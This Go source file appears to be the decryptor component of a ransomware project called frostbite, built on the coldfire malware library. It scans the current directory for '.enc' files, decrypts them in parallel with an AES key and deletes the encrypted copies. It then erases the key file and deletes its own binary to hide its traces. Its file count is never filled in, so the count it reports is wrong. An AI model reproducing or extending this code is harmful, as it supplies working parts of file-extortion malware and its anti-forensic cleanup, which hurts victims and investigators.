package file

import (
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	cf "frostbite.com/coldfire"
	enc "frostbite.com/encryption"
	scan "frostbite.com/tools/scan"
)

func ErrCheck(err error) {
	if err != nil {
		panic(err)
	}
}

func RunDencryptForCurrentDir(AESKey []byte) (fileList []string) {
	timeToScan := time.Now()
	//get pwd
	currentDir, err := os.Getwd()
	ErrCheck(err)
	DecryptFilesInDir(currentDir, true, AESKey)
	timeToScanEnd := time.Now()
	cf.PrintGood("Files found: " + strconv.Itoa(len(fileList)))
	cf.PrintInfo("Time to scan user files: " + timeToScanEnd.Sub(timeToScan).String())
	return fileList
}
func DecryptFilesInDir(startDirPath string, skipHiddenDirs bool, AESKey []byte) {
	//scan only non hidden directories
	runtime.GOMAXPROCS(runtime.NumCPU())
	filesToDecrypt := scan.ScanForEncFilesInDir(startDirPath, skipHiddenDirs)

	wg := sync.WaitGroup{}
	wg.Add(len(filesToDecrypt))

	for _, filePath := range filesToDecrypt {
		go func(filePath string) {
			//decrypt file and remove .enc
			enc.DecryptFileAES(AESKey, filePath)
			os.Remove(filePath)
			wg.Done()
		}(filePath)
	}
	wg.Wait()

	//! Remove self after execution
	os.Remove("decrypted.key")
	cf.Remove()

}
